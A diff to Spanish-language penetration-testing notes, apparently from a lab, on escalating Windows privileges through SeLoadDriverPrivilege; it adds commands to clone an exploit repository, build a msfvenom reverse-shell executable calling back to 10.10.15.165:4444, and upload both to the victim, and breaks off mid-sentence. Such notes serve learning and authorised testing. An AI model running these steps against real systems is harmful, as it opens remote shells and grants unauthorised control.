@@ -112,5 +112,23 @@ Este privilegio nos permite cargar y descargar drivers, permitiéndonos subir un
 Para esta explotación usaremos `https://github.com/JoshMorrison99/SeLoadDriverPrivilege`
 
 Nos clonamos el repositorio
-```shel
+```shell
+git clone https://github.com/JoshMorrison99/SeLoadDriverPrivilege.git
 ```
+
+Nos creamos una `Reverse Shell` con [[MSFVENOM]]
+```shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.165 LPORT=4444 -f exe -o rev.exe
+```
+
+Nos subimos los ficheros del repositorio clonado a la maquina victima con
+```shell
+upload ./SeLoadDriverPrivilege/*
+```
+
+Subimos también nuestra shell
+```shell
+upload rev.exe
+```
+
+Nos ponemos en escucha en 
